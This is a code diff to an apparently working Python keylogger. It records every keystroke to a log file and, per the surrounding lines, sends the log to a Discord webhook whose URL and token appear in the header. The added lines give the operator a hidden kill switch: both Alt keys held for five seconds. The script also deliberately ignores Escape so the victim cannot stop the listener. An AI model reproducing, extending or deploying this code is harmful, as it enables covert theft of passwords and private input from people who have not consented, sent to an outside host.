@@ -22,9 +22,14 @@ webhook_url = 'https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY
 # Initialize the idle time counter starting at 30 seconds
 idle_time = 30
 
+# Variables to track the state of the Alt keys and the timer
+left_alt_pressed = False
+right_alt_pressed = False
+alt_timer = None
+
 # Function to handle key press events
 def on_press(key):
-    global idle_time
+    global idle_time, left_alt_pressed, right_alt_pressed, alt_timer
     idle_time = 30  # Reset idle time to 30 seconds on key press
     try:
         with open(log_path, 'a') as f:
@@ -38,11 +43,39 @@ def on_press(key):
             else:
                 f.write(f'[{key}]')
 
+    # Check for Alt key presses
+    if key == keyboard.Key.alt_l:
+        left_alt_pressed = True
+    elif key == keyboard.Key.alt_r:
+        right_alt_pressed = True
+
+    # Start the timer if both Alt keys are pressed
+    if left_alt_pressed and right_alt_pressed and alt_timer is None:
+        alt_timer = threading.Timer(5, stop_keylogger)
+        alt_timer.start()
+
 # Function to handle key release events (optional)
 def on_release(key):
+    global left_alt_pressed, right_alt_pressed, alt_timer
     if key == keyboard.Key.esc:
         # Ignore the Escape key to prevent stopping the listener
         return
+
+    # Check for Alt key releases
+    if key == keyboard.Key.alt_l:
+        left_alt_pressed = False
+    elif key == keyboard.Key.alt_r:
+        right_alt_pressed = False
+
+    # Cancel the timer if either Alt key is released
+    if not (left_alt_pressed and right_alt_pressed) and alt_timer is not None:
+        alt_timer.cancel()
+        alt_timer = None
+
+# Function to stop the keylogger
+def stop_keylogger():
+    print('Both Alt keys held for 5 seconds. Stopping keylogger...')
+    os._exit(0)
 
 # Function to send the log file to Discord
 def send_log_to_discord():
